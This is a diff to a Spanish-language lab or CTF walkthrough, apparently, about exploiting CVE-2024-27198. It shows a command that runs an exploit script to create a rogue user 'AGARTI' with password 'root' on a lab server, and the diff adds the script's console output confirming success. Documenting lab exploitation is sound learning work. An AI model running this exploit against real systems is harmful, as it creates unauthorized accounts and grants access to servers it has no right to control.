@@ -45,6 +45,12 @@ Esta vulnerabilidad crítica con un base score de 9.8, permite ejecutar código 
 
 Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:50000/ -u AGARTI -p root` hemos creado un nuevo usuario (AGARTI) con una nueva contraseña (root). Lo que nos permite acceder a la página web.
 
+```bash
+[+] Version Found:  2023.11.3 (build 147512)
+[+] Server vulnerable, returning HTTP 200
+[+] New user AGARTI created succesfully! Go to http://10.128.148.36:50000//login.html to login with your new credentials :)
+```
+
 ![](Evidencias_Visuales/newcredentials)
 
 ![](Evidencias_Visuales/newlogin)
